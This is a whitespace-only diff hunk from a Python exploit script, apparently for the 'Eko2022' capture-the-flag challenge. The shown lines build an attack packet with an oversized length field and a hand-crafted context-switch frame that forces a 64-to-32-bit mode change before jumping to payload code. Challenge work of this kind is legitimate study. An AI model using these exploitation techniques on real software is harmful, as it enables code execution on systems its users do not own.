@@ -74,15 +74,15 @@ pkg = b''
 hdr = [
 	b'Eko2022\0',   # cookie
 	b'\x54',        # message id
-	p16(0xFFFF)	    # package size
+	p16(0xFFFF)     # package size
 ]
 
 ctx_switch_64to32 = [
-	p32(0x10000000),		 # RIP
-	p32(0x23),				 # CS (switch to x86)
-	p32(0x246),				 # EFLAG
+	p32(0x10000000),         # RIP
+	p32(0x23),               # CS (switch to x86)
+	p32(0x246),              # EFLAG
 	p32(0x10000000 + 0x800), # RSP
-	p32(0x53)				 # SS
+	p32(0x53)                # SS
 ]
 ctx_switch_64to32[0] = p32(0x10000000 + len(b''.join(ctx_switch_64to32))) # RIP
 pkg += b''.join(ctx_switch_64to32)
